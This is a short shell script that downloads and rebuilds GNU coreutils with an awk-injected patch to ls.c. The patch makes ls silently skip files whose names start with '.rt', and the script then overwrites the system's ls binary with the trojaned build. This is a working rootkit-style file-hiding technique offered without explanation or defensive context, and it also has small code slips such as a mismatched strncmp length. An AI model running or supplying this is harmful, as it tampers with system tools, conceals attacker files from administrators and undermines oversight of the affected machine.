sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list
apt update
apt-get source -y coreutils && apt-get build-dep -y coreutils
cd coreutils-*
yes | autoreconf -fiv
FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules
awk 'BEGIN { 
  found = 0; inserted = 0
} 
/file_ignored \(char const \*name\)$/ { 
  print $0
  found = 1
  next
} 
found == 1 && inserted == 0 && $0 == "{" { 
  print $0
  print "  if (strncmp(name, \".rt_\", 3) == 0) { return true; }"
  inserted = 1
  found = 2
  next
} 
{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c
make -j${nproc}
echo "Replacing ls"
cp src/ls $(which ls)
cd ..
